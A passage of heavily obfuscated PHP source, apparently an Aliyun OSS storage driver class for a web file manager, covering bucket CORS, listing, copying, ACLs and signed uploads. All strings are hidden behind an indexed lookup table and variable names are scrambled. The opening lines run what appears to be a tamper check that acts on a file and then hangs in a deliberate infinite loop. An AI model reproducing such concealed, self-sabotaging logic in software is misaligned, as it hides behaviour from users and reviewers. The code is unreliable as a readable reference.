(!isset($_SERVER[$_SERVER[Ôó‡è­ƒ][872]]) || !isset($_SERVER[$_SERVER[Ôó‡è­ƒ][870]])) { $_getc = $_SERVER[Ôó‡è­ƒ][874]; $_getfile = $_SERVER[$_SERVER[Ôó‡è­ƒ][875]] . $_SERVER[Ôó‡è­ƒ][876]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ôó‡è­ƒ][230], $_getfilec); if (count($_getarrs) < $_SERVER[Ôó‡è­ƒ][606]) { $exit = $_SERVER[Ôó‡è­ƒ][877]; $exit(); } $_act = $_SERVER[Ôó‡è­ƒ][1343]; $_act($_SERVER[$_SERVER[Ôó‡è­ƒ][875]] . $_SERVER[Ôó‡è­ƒ][876]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ôó‡è­ƒ][377]); } } goto c¨ØÑ¬‹İ‡; C·‰í¤Ñé: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($§ËÔå¯º) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ôó‡è­ƒ][1381]; $this->_init($§ËÔå¯º); } public function _init($áåğ™è„) { $à‘™Êµ =& $_SERVER[Ôó‡è­ƒ]; foreach ($áåğ™è„ as $é‹Šù±Ÿ => $ê •˜Ú) { if (isset($this->{$é‹Šù±Ÿ})) { $this->{$é‹Šù±Ÿ} = $ê •˜Ú; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($à‘™Êµ[1382] . LNG($à‘™Êµ[1383])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $»®Ü•Ş¤ =& $_SERVER[Ôó‡è­ƒ]; $¶©¡·Ã = new OSS\Model\CorsConfig(); $±¦æ‹ß = new OSS\Model\CorsRule(); $±¦æ‹ß->addAllowedOrigin($»®Ü•Ş¤[1384]); $±¦æ‹ß->addAllowedMethod($»®Ü•Ş¤[1385]); $±¦æ‹ß->addAllowedMethod($»®Ü•Ş¤[1386]); $±¦æ‹ß->addAllowedMethod($»®Ü•Ş¤[1387]); $±¦æ‹ß->addAllowedMethod($»®Ü•Ş¤[1388]); $±¦æ‹ß->addAllowedMethod($»®Ü•Ş¤[161]); $±¦æ‹ß->setMaxAgeSeconds(600); $±¦æ‹ß->addExposeHeader($»®Ü•Ş¤[1389]); $±¦æ‹ß->addAllowedHeader($»®Ü•Ş¤[1384]); $¶©¡·Ã->addRule($±¦æ‹ß); try { $this->client->putBucketCors($this->bucket, $¶©¡·Ã); } catch (OSS\Core\OssException $éóìç¹“) { return !1; } return !0; } public function getBucketCors() { $¿­ô§ö½ =& $_SERVER[Ôó‡è­ƒ]; $È¢ş¦«¹ = null; try { $È¢ş¦«¹ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ã¤¹—„Ö) { return null; } if (!$È¢ş¦«¹ || !($Ì¶ø£­° = $È¢ş¦«¹->getRules())) { return null; } $Ú…Àíïí = $Ì¶ø£­°[0]->getAllowedOrigins(); $¶¸ãÇ„¯ = $Ì¶ø£­°[0]->getAllowedMethods(); $ôáÖœ°î = $Ì¶ø£­°[0]->getMaxAgeSeconds(); $Ó·ì£ëì = $Ì¶ø£­°[0]->getExposeHeaders(); $¬µ„Ï» = $Ì¶ø£­°[0]->getAllowedHeaders(); return array($¿­ô§ö½[184] => isset($Ú…Àíïí[0]) ? $Ú…Àíïí[0] : $¿­ô§ö½[12], $¿­ô§ö½[188] => $¶¸ãÇ„¯, $¿­ô§ö½[1390] => $ôáÖœ°î, $¿­ô§ö½[1391] => isset($Ó·ì£ëì[0]) ? $Ó·ì£ëì[0] : $¿­ô§ö½[12], $¿­ô§ö½[186] => isset($¬µ„Ï»[0]) ? $¬µ„Ï»[0] : $¿­ô§ö½[12]); } public function isBucketCors() { $Ğ¡É²§ =& $_SERVER[Ôó‡è­ƒ]; $â¯ÇÏ†· = $this->getBucketCors(); if (!$â¯ÇÏ†· || !is_array($â¯ÇÏ†·)) { return !1; } if ($â¯ÇÏ†·[$Ğ¡É²§[184]] != $Ğ¡É²§[185] || $â¯ÇÏ†·[$Ğ¡É²§[186]] != $Ğ¡É²§[185]) { return !1; } $³æ§­É¾ = array_map($Ğ¡É²§[187], $â¯ÇÏ†·[$Ğ¡É²§[188]]); if (!is_array($³æ§­É¾)) { $³æ§­É¾ = array(); } $Ö¬÷¶Âò = array($Ğ¡É²§[189], $Ğ¡É²§[190], $Ğ¡É²§[191], $Ğ¡É²§[192], $Ğ¡É²§[193]); $¸Á‘¦…ß = array_diff($Ö¬÷¶Âò, $³æ§­É¾); return empty($¸Á‘¦…ß); } public function mkfile($Ü£”ìõ´, $´Ê”û¡ = '', $ôÒ«»Ô› = REPEAT_RENAME) { $‹¯·®¸Â = $this->setContent($Ü£”ìõ´, $´Ê”û¡); if ($‹¯·®¸Â !== !1) { return $this->getPathOuter($Ü£”ìõ´); } return !1; } public function mkdir($Á¤ı“ùË, $¢†Íø»© = REPEAT_SKIP) { if ($this->_isFolder($Á¤ı“ùË)) { return $this->getPathOuter($Á¤ı“ùË); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Á¤ı“ùË)); } catch (OSS\Core\OssException $”œÄùª) { return !1; } return $this->getPathOuter($Á¤ı“ùË); } private function fileList($óßôºÓÂ, $ºàÂ±Şğ = '', $­Õ’ıÄ = 0) { $ïêÃü =& $_SERVER[Ôó‡è­ƒ]; $óßôºÓÂ = trim($óßôºÓÂ, $ïêÃü[8]); $’‘ÅÚÀÏ = empty($óßôºÓÂ) && $óßôºÓÂ !== $ïêÃü[194] ? $ïêÃü[12] : $óßôºÓÂ . $ïêÃü[8]; $âÜÅÎøÈ = $ïêÃü[12]; $º†‰™Äó = 1000; $ıÆŠÖì = $this->listItemCache === !1 ? !1 : !0; $ Ÿåüõá = $©Å°Ìİå = array(); while (!0) { check_abort(); $õøó£š = array($ïêÃü[1392] => $ºàÂ±Şğ, $ïêÃü[1393] => $’‘ÅÚÀÏ, $ïêÃü[1394] => $º†‰™Äó, $ïêÃü[1395] => $âÜÅÎøÈ); try { $İÉ°ÔŒ = $this->client->listObjects($this->bucket, $õøó£š); } catch (OSS\Core\OssException $Ğ›§îõ´) { break; } $âÜÅÎøÈ = $İÉ°ÔŒ->getNextMarker(); $ºè¡ØìŸ = $İÉ°ÔŒ->getObjectList(); $ËÎÂ•†Ê = $İÉ°ÔŒ->getPrefixList(); foreach ($ºè¡ØìŸ as $çö“İİè) { if ($çö“İİè->getKey() == $’‘ÅÚÀÏ) { continue; } $äğ Ñ¤¬ = $çö“İİè->getKey(); $ƒ—¸ÄŸ” = $çö“İİè->getSize(); $Ò½¿‡„õ = $çö“İİè->getLastModified(); $ò¤¤š÷ = $­Õ’ıÄ ? array($ïêÃü[32] => $äğ Ñ¤¬, $ïêÃü[80] => $ƒ—¸ÄŸ”, $ïêÃü[200] => strtotime($Ò½¿‡„õ)) : $äğ Ñ¤¬; $êÓ®³Í = $ƒ—¸ÄŸ” == 0 && substr($äğ Ñ¤¬, strlen($äğ Ñ¤¬) - 1, 1) == $ïêÃü[8] ? !0 : !1; if ($ıÆŠÖì) { $this->cacheMethod($ïêÃü[202], $äğ Ñ¤¬, $êÓ®³Í); $this->cacheMethod($ïêÃü[203], $äğ Ñ¤¬, array($ïêÃü[80] => $ƒ—¸ÄŸ”, $ïêÃü[1396] => $ƒ—¸ÄŸ”, $ïêÃü[86] => strtotime($Ò½¿‡„õ), $ïêÃü[1397] => $Ò½¿‡„õ)); } if ($êÓ®³Í) { $ Ÿåüõá[] = $äğ Ñ¤¬; continue; } $©Å°Ìİå[] = $ò¤¤š÷; } foreach ($ËÎÂ•†Ê as $ø˜¾³³æ) { $ Ÿåüõá[] = $ø˜¾³³æ->getPrefix(); if ($ıÆŠÖì) { $this->cacheMethod($ïêÃü[202], $äğ Ñ¤¬, !0); } } if ($âÜÅÎøÈ === $ïêÃü[12]) { break; } } if ($ıÆŠÖì) { $this->cacheMethod($ïêÃü[202], $óßôºÓÂ, !0); } return array($ïêÃü[77] => $ Ÿåüõá, $ïêÃü[76] => $©Å°Ìİå); } public function copyFile($ÃÙ¶ş÷, $î¿¡˜Ä’) { $Ó·È†Œ = $this->size($ÃÙ¶ş÷); if ($Ó·È†Œ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ÃÙ¶ş÷, $this->bucket, $this->pathEncode($î¿¡˜Ä’)); } catch (OSS\Core\OssException $×ïüÖÒê) { return !1; } return $this->getPathOuter($î¿¡˜Ä’); } $€ï«ÇÇ = $this->multiCopyObject($ÃÙ¶ş÷, $î¿¡˜Ä’, $Ó·È†Œ); return $€ï«ÇÇ ? $this->getPathOuter($î¿¡˜Ä’) : !1; } private function multiCopyObject($üÒß¡¾ª, $¬¦ÁÌó¹, $ßÏ˜èêş) { $ê‰Ø­ è =& $_SERVER[Ôó‡è­ƒ]; try { $êûĞ½ = array(); if ($ éÛ …Š = $this->hashMd5($üÒß¡¾ª)) { $êûĞ½ = array(OSS\OssClient::OSS_HEADERS => array($ê‰Ø­ è[1398] => $ éÛ …Š)); } $—ş™Ìğ† = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¬¦ÁÌó¹), $êûĞ½); $£¦Ç²ãÕ = 1; $•ç„˜—¸ = 0; $›¢Ä»½¦ = array(); $ËÊ“ıøÓ = 1024 * 1024 * 10; $®ïôÀ = $this->client->generateMultiuploadParts($ßÏ˜èêş, $ËÊ“ıøÓ); foreach ($®ïôÀ as $ºî®™Á => $Ôà¶§) { $³÷ÎŸÙ = $•ç„˜—¸ + (int) $Ôà¶§[$ê‰Ø­ è[1399]]; $ÔûÆÛëŒ = (int) $Ôà¶§[$ê‰Ø­ è[336]] + $³÷ÎŸÙ - 1; $¤Â±¡°— = array($ê‰Ø­ è[1400] => $³÷ÎŸÙ, $ê‰Ø­ è[1401] => $ÔûÆÛëŒ); $›¢Ä»½¦[] = $this->client->uploadPartCopy($this->bucket, $üÒß¡¾ª, $this->bucket, $this->pathEncode($¬¦ÁÌó¹), $£¦Ç²ãÕ, $—ş™Ìğ†, $¤Â±¡°—); $£¦Ç²ãÕ = $£¦Ç²ãÕ + 1; } $³ËÈ¾ = array(); foreach ($›¢Ä»½¦ as $ºî®™Á => $èÏª­İİ) { $³ËÈ¾[] = array($ê‰Ø­ è[1402] => $ºî®™Á + 1, $ê‰Ø­ è[1403] => $èÏª­İİ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($¬¦ÁÌó¹), $—ş™Ìğ†, $³ËÈ¾); } catch (OSS\Core\OssException $×°§÷á) { return !1; } return !0; } public function moveFile($‰è ŒÊƒ, $‹õÈ­’¿) { if ($this->copyFile($‰è ŒÊƒ, $‹õÈ­’¿)) { $this->remove($‰è ŒÊƒ); return $this->getPathOuter($‹õÈ­’¿); } return !1; } public function delFile($àôôÍÜ ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($àôôÍÜ )); } catch (OSS\Core\OssException $´ ¶½™) { return !1; } return !0; } public function delFolder($å·Í¿Ç„) { $”³ÔáÏ =& $_SERVER[Ôó‡è­ƒ]; if (!$this->exist($å·Í¿Ç„)) { return !0; } $this->listItemCache = !1; $æ‚ÏëĞÉ = $this->fileList($å·Í¿Ç„); $this->listItemCache = !0; $ŞäôÍ = trim($å·Í¿Ç„, $”³ÔáÏ[8]) . $”³ÔáÏ[8]; if (!empty($å·Í¿Ç„) && $å·Í¿Ç„ !== $”³ÔáÏ[194] && !in_array($ŞäôÍ, $æ‚ÏëĞÉ[$”³ÔáÏ[77]])) { $æ‚ÏëĞÉ[$”³ÔáÏ[77]][] = $ŞäôÍ; } $¿Ú¶¨÷ = $this->delByBatch($æ‚ÏëĞÉ[$”³ÔáÏ[76]]); if (!$¿Ú¶¨÷) { return !1; } $¿Ú¶¨÷ = $this->delByBatch($æ‚ÏëĞÉ[$”³ÔáÏ[77]]); if (!$¿Ú¶¨÷) { return !1; } return $this->delFile($ŞäôÍ); } private function delByBatch($›ñ“ºÆş) { foreach (array_chunk($›ñ“ºÆş, 1000) as $¤÷àÑ”) { try { $this->client->deleteObjects($this->bucket, $¤÷àÑ”); } catch (OSS\Core\OssException $¢Ç‰Ô§æ) { return !1; } } return !0; } public function rename($ÚÚ§üô¼, $¦‘±ò) { return $this->renameObject($ÚÚ§üô¼, $¦‘±ò); } private function fileInfo($˜‹ÀÛ©Ã, $×”÷§ÜÙ = false, $Æ£÷Ö´ô = array()) { $÷ôğ“ó =& $_SERVER[Ôó‡è­ƒ]; $Â×ø¤ü = array($÷ôğ“ó[32] => $this->pathThis($˜‹ÀÛ©Ã), $÷ôğ“ó[78] => $this->getPathOuter($˜‹ÀÛ©Ã), $÷ôğ“ó[33] => $÷ôğ“ó[196], $÷ôğ“ó[80] => isset($Æ£÷Ö´ô[$÷ôğ“ó[80]]) ? $Æ£÷Ö´ô[$÷ôğ“ó[80]] : 0, $÷ôğ“ó[171] => $this->ext($˜‹ÀÛ©Ã)); if ($×”÷§ÜÙ) { return $Â×ø¤ü; } $Â×ø¤ü[$÷ôğ“ó[197]] = $Â×ø¤ü[$÷ôğ“ó[86]] = 0; $Â×ø¤ü[$÷ôğ“ó[198]] = $Â×ø¤ü[$÷ôğ“ó[199]] = !0; if (empty($Æ£÷Ö´ô)) { $àæÖâ˜¹ = $this->objectMeta($˜‹ÀÛ©Ã); if (!$àæÖâ˜¹) { return $Â×ø¤ü; } $Æ£÷Ö´ô = array($÷ôğ“ó[86] => strtotime($àæÖâ˜¹[$÷ôğ“ó[1397]]), $÷ôğ“ó[80] => $àæÖâ˜¹[$÷ôğ“ó[1396]] + 0); } if (isset($Æ£÷Ö´ô[$÷ôğ“ó[80]])) { $Â×ø¤ü[$÷ôğ“ó[80]] = $Æ£÷Ö´ô[$÷ôğ“ó[80]]; } if (isset($Æ£÷Ö´ô[$÷ôğ“ó[86]])) { $Â×ø¤ü[$÷ôğ“ó[86]] = $Æ£÷Ö´ô[$÷ôğ“ó[86]]; } if (isset($Æ£÷Ö´ô[$÷ôğ“ó[200]]) && !trim($Â×ø¤ü[$÷ôğ“ó[86]])) { $Â×ø¤ü[$÷ôğ“ó[86]] = $Æ£÷Ö´ô[$÷ôğ“ó[200]]; } return $Â×ø¤ü; } private function folderInfo($©‡‹Ô¹Á, $ö–úŠúÉ = false, $ııªÒŒ‹ = array()) { $Şà¡É¯ =& $_SERVER[Ôó‡è­ƒ]; $÷Ğí¸öæ = array($Şà¡É¯[32] => $this->pathThis($©‡‹Ô¹Á), $Şà¡É¯[78] => $this->getPathOuter($Şà¡É¯[8] . $©‡‹Ô¹Á), $Şà¡É¯[33] => $Şà¡É¯[79]); if ($ö–úŠúÉ) { return $÷Ğí¸öæ; } $÷Ğí¸öæ[$Şà¡É¯[197]] = $÷Ğí¸öæ[$Şà¡É¯[86]] = 0; $÷Ğí¸öæ[$Şà¡É¯[198]] = $÷Ğí¸öæ[$Şà¡É¯[199]] = !0; if (empty($ııªÒŒ‹)) { $©‡‹Ô¹Á = rtrim($©‡‹Ô¹Á, $Şà¡É¯[8]) . $Şà¡É¯[8]; $É«‚íÏ = $this->objectMeta($©‡‹Ô¹Á); if (!$É«‚íÏ) { return $÷Ğí¸öæ; } $ııªÒŒ‹ = array($Şà¡É¯[197] => $É«‚íÏ[$Şà¡É¯[507]][$Şà¡É¯[1404]], $Şà¡É¯[86] => strtotime($É«‚íÏ[$Şà¡É¯[1397]])); } if (isset($ııªÒŒ‹[$Şà¡É¯[86]])) { $÷Ğí¸öæ[$Şà¡É¯[86]] = $ııªÒŒ‹[$Şà¡É¯[86]]; } if (isset($ııªÒŒ‹[$Şà¡É¯[197]])) { $÷Ğí¸öæ[$Şà¡É¯[197]] = $ııªÒŒ‹[$Şà¡É¯[197]]; } return $÷Ğí¸öæ; } public function listPath($Û™’íÉ×, $¤´çç½ı = false) { $ˆ¬©ô€ú =& $_SERVER[Ôó‡è­ƒ]; $…Œä„ğ = $this->fileList($Û™’íÉ×, $ˆ¬©ô€ú[8], !0); foreach ($…Œä„ğ[$ˆ¬©ô€ú[77]] as $Ùû£Ü› => $´×Ä÷Õ) { $…Œä„ğ[$ˆ¬©ô€ú[77]][$Ùû£Ü›] = $this->folderInfo($´×Ä÷Õ, $¤´çç½ı, $´×Ä÷Õ); } foreach ($…Œä„ğ[$ˆ¬©ô€ú[76]] as $Ùû£Ü› => $´×Ä÷Õ) { $…Œä„ğ[$ˆ¬©ô€ú[76]][$Ùû£Ü›] = $this->fileInfo($´×Ä÷Õ[$ˆ¬©ô€ú[32]], $¤´çç½ı, $´×Ä÷Õ); } return $…Œä„ğ; } public function has($ìÉŒøñ, $˜÷Âçä· = false, $­ÍùìÊó = true) { $Şã®êŞ =& $_SERVER[Ôó‡è­ƒ]; $ìÉŒøñ = trim($ìÉŒøñ, $Şã®êŞ[8]); $Îî±ê±í = empty($ìÉŒøñ) && $ìÉŒøñ !== $Şã®êŞ[194] ? $Şã®êŞ[12] : $ìÉŒøñ . $Şã®êŞ[8]; $üÊ¹ø³Ë = $Şã®êŞ[12]; $˜ÓĞèñ™ = 500; $¨©Í”ÂØ = $°—Ä©¿ğ = 0; while (!0) { check_abort(); $¼Ç½‰» = array($Şã®êŞ[1392] => $Şã®êŞ[8], $Şã®êŞ[1393] => $Îî±ê±í, $Şã®êŞ[1394] => $˜ÓĞèñ™, $Şã®êŞ[1395] => $üÊ¹ø³Ë); try { $¨•ï¾ãÀ = $this->client->listObjects($this->bucket, $¼Ç½‰»); } catch (OSS\Core\OssException $¤¥ˆÕ„Ñ) { break; } $üÊ¹ø³Ë = $¨•ï¾ãÀ->getNextMarker(); $ÍÄåÜ¯í = $¨•ï¾ãÀ->getObjectList(); $šÂ¬±æ = $¨•ï¾ãÀ->getPrefixList(); if ($˜÷Âçä·) { if (count($ÍÄåÜ¯í) > 1 || count($ÍÄåÜ¯í) == 1 && $ÍÄåÜ¯í[0]->getKey() != $Îî±ê±í) { $¨©Í”ÂØ += count($ÍÄåÜ¯í) - 1; } if (!empty($šÂ¬±æ)) { $°—Ä©¿ğ += count($šÂ¬±æ); } if ($üÊ¹ø³Ë === $Şã®êŞ[12]) { break; } continue; } if ($­ÍùìÊó) { if (!empty($ÍÄåÜ¯í)) { if (count($ÍÄåÜ¯í) > 1 || $ÍÄåÜ¯í[0]->getKey() != $Îî±ê±í) { return !0; } } } else { if (!empty($šÂ¬±æ)) { return !0; } } if ($üÊ¹ø³Ë === $Şã®êŞ[12]) { break; } } if ($˜÷Âçä·) { return array($Şã®êŞ[206] => $¨©Í”ÂØ, $Şã®êŞ[207] => $°—Ä©¿ğ); } return !1; } public function listAll($¾·£‰æ) { $ÃĞàÍ¯´ =& $_SERVER[Ôó‡è­ƒ]; $´³úÓ› = $this->fileList($¾·£‰æ, $ÃĞàÍ¯´[12], !0); $¬æä•ç¹ = array(); foreach ($´³úÓ›[$ÃĞàÍ¯´[76]] as $ş÷½ÉÔ) { $¬æä•ç¹[$ş÷½ÉÔ[$ÃĞàÍ¯´[32]]] = $ş÷½ÉÔ[$ÃĞàÍ¯´[80]]; } foreach ($´³úÓ›[$ÃĞàÍ¯´[77]] as $ş÷½ÉÔ) { if (is_string($ş÷½ÉÔ)) { $¬æä•ç¹[$ş÷½ÉÔ] = 0; } } return $this->listAllFiles($¾·£‰æ, array_keys($¬æä•ç¹), $¬æä•ç¹); } public function canRead($Ê¡–ì«) { $ŞËö•öÓ =& $_SERVER[Ôó‡è­ƒ]; $ÄÃ ¾®Ó = $this->pathAcl($Ê¡–ì«); return $ÄÃ ¾®Ó == $ŞËö•öÓ[1405] || $ÄÃ ¾®Ó == $ŞËö•öÓ[549] ? !0 : !1; } public function canWrite($´ÏˆÜÇï) { $ó­¡¿‚Ë = $this->pathAcl($´ÏˆÜÇï); return $ó­¡¿‚Ë == $_SERVER[Ôó‡è­ƒ][549] ? !0 : !1; } public function pathAcl($½³°­Ä) { $‰ùíÙ¹• =& $_SERVER[Ôó‡è­ƒ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ß’«áùä = $this->client->getObjectAcl($this->bucket, $this->pathEncode($½³°­Ä)); } catch (OSS\Core\OssException $’Ù¢¼½Í) { return !1; } $ë€œ¨È° = $ß’«áùä == $‰ùíÙ¹•[37] ? $this->bucketAcl : $ß’«áùä; if ($ë€œ¨È° == $‰ùíÙ¹•[1406]) { return $‰ùíÙ¹•[1405]; } if ($ë€œ¨È° == $‰ùíÙ¹•[1407]) { return $‰ùíÙ¹•[549]; } return $ë€œ¨È°; } private function chmodPath($Ù°ËÏ¤, $ÏÔáÏñ = '') { $Û¾ûæ–¶ =& $_SERVER[Ôó‡è­ƒ]; $‚øòÍ = empty($ÏÔáÏñ) ? $Û¾ûæ–¶[1407] : $ÏÔáÏñ; $ÚàÇè´ = array($Û¾ûæ–¶[37], $Û¾ûæ–¶[195], $Û¾ûæ–¶[1406], $Û¾ûæ–¶[1407]); if (!in_array($‚øòÍ, $ÚàÇè´)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Ù°ËÏ¤), $‚øòÍ); } catch (OSS\Core\OssException $¬Û¢•’) { return !1; } return !0; } public function getContent($›®‘öÄ) { return $this->fileSubstr($›®‘öÄ, -1); } public function setContent($Èâã€é, $ÎØì€¿¬ = '') { $½úÎ˜›İ =& $_SERVER[Ôó‡è­ƒ]; try { $÷‚ˆ‹°‹ = $this->trafficLimit($½úÎ˜›İ[1408]); $ØºÆı‰¾ = $this->client->putObject($this->bucket, $this->pathEncode($Èâã€é), $ÎØì€¿¬, $÷‚ˆ‹°‹); } catch (OSS\Core\OssException $¼¨Ö’‘¬) { return !1; } $Æ…é åî = array($½úÎ˜›İ[1398] => trim($ØºÆı‰¾[$½úÎ˜›İ[1409]], $½úÎ˜›İ[119]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Èâã€é))); $this->updateObjMeta($Èâã€é, $Æ…é åî); return isset($ØºÆı‰¾[$½úÎ˜›İ[1410]][$½úÎ˜›İ[1357]]) ? !0 : !1; } private function updateObjMeta($¢İÛÌèÁ, $åØé¥ş¢) { $¢İÛÌèÁ = $this->pathEncode($¢İÛÌèÁ); try { $É‡ğ˜¯ = array(OSS\OssClient::OSS_HEADERS => $åØé¥ş¢); $this->client->copyObject($this->bucket, $¢İÛÌèÁ, $this->bucket, $¢İÛÌèÁ, $É‡ğ˜¯); } catch (OSS\Core\OssException $»ëªÁÜ) { return !1; } return !0; } public function upload($Œ¬È‰Ç, $üø¯„Ù, $²³ëâ†± = false, $Ï°ßĞÕï = REPEAT_REPLACE) { $”±¾ˆ§ =& $_SERVER[Ôó‡è­ƒ]; $«Î”Àƒ¬ = trim($Œ¬È‰Ç, $”±¾ˆ§[8]); $ˆû¶ƒâ† = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($”±¾ˆ§[1398] => @md5_file($üø¯„Ù)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Œ¬È‰Ç))); $ˆû¶ƒâ† = $this->trafficLimit($”±¾ˆ§[1408], $ˆû¶ƒâ†); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($«Î”Àƒ¬), $üø¯„Ù, $ˆû¶ƒâ†); } catch (OSS\Core\OssException $ïáˆËËÏ) { return !1; } return $this->getPathOuter($Œ¬È‰Ç); } public function getHost() { $³Ğ£ =& $_SERVER[Ôó‡è­ƒ]; $Ù„õƒàš = explode($³Ğ£[180], parent::getHost()); return $Ù„õƒàš[0] . $³Ğ£[180] . $this->bucket . $³Ğ£[10] . $Ù„õƒàš[1]; } public function uploadFormData($Ç“Éí€, $ñ÷©Ë¤Ò = 3600) { $Ö½òÕæç =& $_SERVER[Ôó‡è­ƒ]; if (!($Ñ¤ò²äÛ = $this->getHost())) { return !1; } $ŸÅ†áÈÎ = $ñ÷©Ë¤Ò; $ÃÄ™ñš = date($Ö½òÕæç[1411], time() + $ŸÅ†áÈÎ); $÷’±ç• = new DateTime($ÃÄ™ñš); $Î”¡º±Í = $÷’±ç•->format(DateTime::ISO8601); $°«ªş = strpos($Î”¡º±Í, $Ö½òÕæç[295]); $Î”¡º±Í = substr($Î”¡º±Í, 0, $°«ªş) . $Ö½òÕæç[1412]; $ËÖÊÃ’» = 1048576000 * 5; $à³½¸„ = $this->pathFather($Ç“Éí€); $çƒ«¥ƒ© = array($Ö½òÕæç[1310] => $Î”¡º±Í, $Ö½òÕæç[1311] => array(array($Ö½òÕæç[1413], 0, $ËÖÊÃ’»), array($Ö½òÕæç[1314], $Ö½òÕæç[1315], $à³½¸„))); $Í¾šòÜ“ = base64_encode(json_encode($çƒ«¥ƒ©)); $Šúıú±Õ = base64_encode(hash_hmac($Ö½òÕæç[231], $Í¾šòÜ“, $this->secret, !0)); $œ„åÛÈÉ = array($Ö½òÕæç[1320] => $Í¾šòÜ“, $Ö½òÕæç[1414] => $this->accessKey, $Ö½òÕæç[1316] => $Ö½òÕæç[1308], $Ö½òÕæç[1415] => $Šúıú±Õ, $Ö½òÕæç[178] => $Ñ¤ò²äÛ); $œ„åÛÈÉ = $this->trafficLimit($Ö½òÕæç[1408], $œ„åÛÈÉ); return $œ„åÛÈÉ; } public function multiUploadFormData($êº”ºÊÅ, $ªÖ›Šî• = 3600) { $ğÃ‡ÂÇ =& $_SERVER[Ôó‡è­ƒ]; if (!($¥°´í—ë = $this->getHost())) { return !1; } $±Î·ÎœÏ = $this->trafficLimit($ğÃ‡ÂÇ[1408]); $§Ñ¥äˆ• = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($êº”ºÊÅ), $±Î·ÎœÏ); return array($ğÃ‡ÂÇ[222] => $§Ñ¥äˆ•, $ğÃ‡ÂÇ[178] => $¥°´í—ë . $ğÃ‡ÂÇ[8] . $this->pathEncode($êº”ºÊÅ), $ğÃ‡ÂÇ[223] => gmdate($ğÃ‡ÂÇ[1416]), $ğÃ‡ÂÇ[95] => $êº”ºÊÅ); } public function multiUploadAuthData($„­ìŞû, $ç¢ß³íñ = array()) { $Í‘ÜÅ¾ =& $_SERVER[Ôó‡è­ƒ]; $Íšíùö = isset($ç¢ß³íñ[$Í‘ÜÅ¾[223]]) ? $ç¢ß³íñ[$Í‘ÜÅ¾[223]] : gmdate($Í‘ÜÅ¾[1416]); $°õÌ‹½ = isset($ç¢ß³íñ[$Í‘ÜÅ¾[171]]) ? $ç¢ß³íñ[$Í‘ÜÅ¾[171]] : $Í‘ÜÅ¾[12]; $•”¡è¡ = $„­ìŞû; if (isset($ç¢ß³íñ[$Í‘ÜÅ¾[95]])) { $•”¡è¡ = $ç¢ß³íñ[$Í‘ÜÅ¾[95]]; unset($ç¢ß³íñ[$Í‘ÜÅ¾[95]]); } if (isset($ç¢ß³íñ[$Í‘ÜÅ¾[224]])) { $ç¢ß³íñ[$Í‘ÜÅ¾[223]] = $Íšíùö; return $this->listUploadParts($•”¡è¡, $ç¢ß³íñ); } $ÊïŞ‘Ï¹ = array($Í‘ÜÅ¾[225], $Í‘ÜÅ¾[12], $Í‘ÜÅ¾[121], $Íšíùö, "\170\x2d\x6f\163\x73\x2d\144\141\164\x65\x3a{$Íšíùö}", $Í‘ÜÅ¾[8] . $this->bucket . $Í‘ÜÅ¾[8] . $•”¡è¡ . $°õÌ‹½); if (strpos($°õÌ‹½, $Í‘ÜÅ¾[226]) === 0) { $ÊïŞ‘Ï¹[0] = $Í‘ÜÅ¾[227]; if ($İ²¢–Ù = $this->trafficLimit($Í‘ÜÅ¾[1408])) { $•”¡è¡ = $Í‘ÜÅ¾[1417]; array_splice($ÊïŞ‘Ï¹, 5, 0, $•”¡è¡ . $Í‘ÜÅ¾[4] . $İ²¢–Ù[$•”¡è¡]); } } if (isset($ç¢ß³íñ[$Í‘ÜÅ¾[228]]) && $ç¢ß³íñ[$Í‘ÜÅ¾[228]] == $Í‘ÜÅ¾[229]) { $ÊïŞ‘Ï¹[0] = $Í‘ÜÅ¾[229]; } if (!empty($ç¢ß³íñ[$Í‘ÜÅ¾[1418]])) { $”ĞüÚ¤› = array_merge(array($ÊïŞ‘Ï¹[4]), $ç¢ß³íñ[$Í‘ÜÅ¾[1418]]); sort($”ĞüÚ¤›); $ÊïŞ‘Ï¹[4] = implode($Í‘ÜÅ¾[230], $”ĞüÚ¤›); } $—²Ó™ïì = implode($Í‘ÜÅ¾[230], $ÊïŞ‘Ï¹); $´ØÃÉ…  = base64_encode(hash_hmac($Í‘ÜÅ¾[231], $—²Ó™ïì, $this->secret, !0)); $”ıé¹Áú = $Í‘ÜÅ¾[1382] . $this->accessKey . $Í‘ÜÅ¾[4] . $´ØÃÉ… ; if (strpos($°õÌ‹½, $Í‘ÜÅ¾[226]) === 0) { $”ıé¹Áú = array($Í‘ÜÅ¾[233] => $”ıé¹Áú, $Í‘ÜÅ¾[223] => $Íšíùö); if ($İ²¢–Ù) { $”ıé¹Áú = array_merge($”ıé¹Áú, $İ²¢–Ù); } } return $”ıé¹Áú; } public function listUploadParts($˜†€®êÏ, $ì·×Òó) { $ââ»“–­ =& $_SERVER[Ôó‡è­ƒ]; $ÇÌşïêÀ = parse_url_query($ì·×Òó[$ââ»“–­[171]]); $Ùßşòüı = $this->client->listParts($this->bucket, $this->pathEncode($˜†€®êÏ), 